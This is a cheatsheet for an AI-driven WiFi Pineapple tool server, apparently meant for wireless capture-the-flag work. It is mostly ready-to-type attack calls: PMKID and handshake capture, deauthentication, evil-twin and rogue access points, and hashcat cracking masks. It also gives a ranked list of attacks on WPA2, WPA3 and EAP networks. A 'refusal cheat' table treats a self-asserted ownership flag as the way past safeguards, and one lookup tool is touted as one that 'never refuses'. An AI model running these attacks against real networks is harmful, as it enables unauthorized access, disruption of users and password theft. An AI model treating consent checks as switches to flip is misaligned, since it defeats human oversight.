# cheatsheet — one page, tape to the Pineapple

The 20 tool calls you type most, in the order you type them. Everything
here has a corpus entry that goes deeper; when you have time, read
those. When you don't, this is the page.

Every transmitting call needs `i_own_the_airspace=True` or an
`authorization` scope — omitted below for brevity, add it every time.
See [`legal_and_consent.md`](legal_and_consent.md).

## Session opener

```python
pineapple_status()                                   # both transports up?
do_list_interfaces()                                 # wlan0, wlan1 present, monitor-capable?
```

If SSH is `MissingConfig`, fix env now — every transmitting tool needs it later.

## Recon

```python
run_sequence([
  {"action": "recon_start", "band": "both", "dwell_ms": 250},
  {"action": "wait", "s": 15},
  {"action": "recon_stop"},
])
list_aps(seen_since_s=20)                            # sort by security in your head
list_clients()                                       # who's on-air right now
list_probe_requests(seen_since_s=60)                 # hidden-SSID reveals hide here
list_associations()                                  # who's associated to what
get_ap_details(bssid="AA:BB:CC:DD:EE:FF")            # single-AP zoom-in
```

## Attack — fastest first

```python
# PMKID fastpath — no client needed
do_capture_pmkid(bssid="AA:BB:CC:DD:EE:FF", timeout_s=30)

# 4-way with targeted deauth
do_capture_handshake(bssid="AA:BB:CC:DD:EE:FF",
                     deauth_client="11:22:33:44:55:66",
                     timeout_s=60)

# Rogue AP + evil twin
do_create_rogue_ap(ssid="target", channel=6, band="2.4", security="open")
do_evil_twin(target_bssid="AA:BB:CC:DD:EE:FF",
             target_ssid="target", target_channel=6)
do_deauth(bssid="AA:BB:CC:DD:EE:FF", count=5, respect_pmf=True)
```

## Perceive → crack

```python
parse_pcap(path="/tmp/handshake-…-01.pcap")
extract_handshakes(pcap_path="…", out_path="/tmp/hs.pcapng")
extract_pmkids(pcap_path="…", out_path="/tmp/pmkid.pcapng")
convert_to_hashcat(pcap_path="…", out_path="/tmp/hs.22000")
crack_start(hash_path="/tmp/hs.22000",
            wordlist_path="rockyou.txt", mode=22000)
```

## Diagnose

```python
call_log(ssh=True, api=True)                         # merged post-mortem
recon_status()                                       # is recon actually running?
verify_claim("Does PMF stop deauth?")                # answers with a cite
```

## The knowledge layer — when the ground is unfamiliar

```python
lookup_attack("pmkid-capture")                       # preconditions, tools, hashcat mode
lookup_ie(48)                                        # RSN IE layout (or by name)
lookup_frame(0, 12)                                  # deauth frame layout
lookup_cve("CVE-2017-13077")                         # KRACK
lookup_hashcat_mode(22000)                           # capture format + example line
explain_attack("wpa3-transition-downgrade")          # never refuses
```

## Hashcat mask cookbook (mode 22000)

| shape             | mask                                | who              | time (~2 MH/s) |
| ----------------- | ----------------------------------- | ---------------- | -------------- |
| 8 digits          | `?d?d?d?d?d?d?d?d`                  | WPS-derived      | seconds        |
| 10 digits         | `?d?d?d?d?d?d?d?d?d?d`              | phone-length ISP | seconds        |
| 6 lower + 4 dig   | `?l?l?l?l?l?l?d?d?d?d`              | `kevin1985`      | minutes        |
| cap + 5 low + 2 d | `?u?l?l?l?l?l?d?d`                  | `Autumn24`       | minutes        |
| word + 4 digits   | `-a 6 rockyou.txt ?d?d?d?d`         | hybrid W+M       | minutes        |
| all 8 printable   | `?a?a?a?a?a?a?a?a`                  | don't            | ~33 days       |

Reach order: `rockyou` (30 s) → `rockyou -r best64` (5 min) →
`rockyou -r OneRuleToRuleThemAll` (1–2 h) → structured masks →
SSID-derived wordlist (`cewl` the venue) → hybrid → walk away, work
another puzzle.

## The 22000 line format

```
WPA*<type>*<PMKID/MIC>*<AP_MAC>*<STA_MAC>*<ESSID hex>*<ANonce>*<EAPOL frame>*<MC>
```

- `type=01` — PMKID (M1 only)
- `type=02` — EAPOL 4-way (any subset with M2)

If `hcxpcapngtool --info` says 0 lines produced, the capture is bad —
see [`handshake_forensics.md`](handshake_forensics.md).

## Refusal cheat — when a tool says no

| envelope says                                    | fix                                              |
| ------------------------------------------------ | ------------------------------------------------ |
| `AuthorizationRequired`                          | set `i_own_the_airspace=True` or scoped authz    |
| `NotImplementedError: wpa2_eap`                  | rogue-RADIUS is deferred — hostapd-wpe over SSH  |
| `respect_pmf=True` refusal + cite                | PMF is on; look for side channel                 |
| `MissingConfig: PINEAPPLE_SSH_KEY/PASSWORD`      | set env, restart the MCP server                  |
| API 401                                          | token rotated — regenerate in WebUI              |
| API 429 / 5xx storm                              | `export PINEAPPLE_TRANSPORT_PREF=ssh`            |
| `NotImplementedError: pcapng`                    | you're on an old build — `pip install .` again   |

## Envelope shape — what every Pineapple call returns

```json
{"ok": true, "transport": "api"|"ssh",
 "payload": {...}, "timing_ms": 42, "warnings": []}
```

- `warnings[]` is where interesting half-successes live: PMF cites,
  hcxdumptool non-zero exits, HTTP 5xx swallowed by retry.
- `transport` says which surface answered. If you asked for `api` and
  got `ssh`, the API rate-limited or 5xx'd — read `warnings[]`.

## Reach order — first 60 seconds

1. **WPS on, configured, unlocked, vulnerable vendor** — Pixie Dust.
2. **PMKID in M1** — capture, convert, mode 22000.
3. **Vendor default SSID** — derive without cracking.
4. **WPA3 transition** — downgrade a WPA2-capable client.
5. **PMF off + live client** — targeted deauth, 4-way.
6. **WPA-EAP + weak cert validation** — rogue-RADIUS, MSCHAPv2 → mode 5500.
7. **Exotic IE** — beacon-stego; decode, don't crack.
8. **Full WPA3-SAE, PMF-required** — Dragonblood side channel or pivot.

Deeper: [`knowledge/ctf/strategy.md`](../knowledge/ctf/strategy.md).

## Deeper docs

- **Recipes** — [`recipes.md`](recipes.md) — 10 pre-baked `run_sequence` JSON blobs.
- **When things break** — [`troubleshooting.md`](troubleshooting.md).
- **Capture failed?** — [`handshake_forensics.md`](handshake_forensics.md).
- **Where the puzzle lives** — [`wctf_playbook.md`](wctf_playbook.md).
- **Which transport?** — [`transport_split.md`](transport_split.md).
- **Legal** — [`legal_and_consent.md`](legal_and_consent.md).
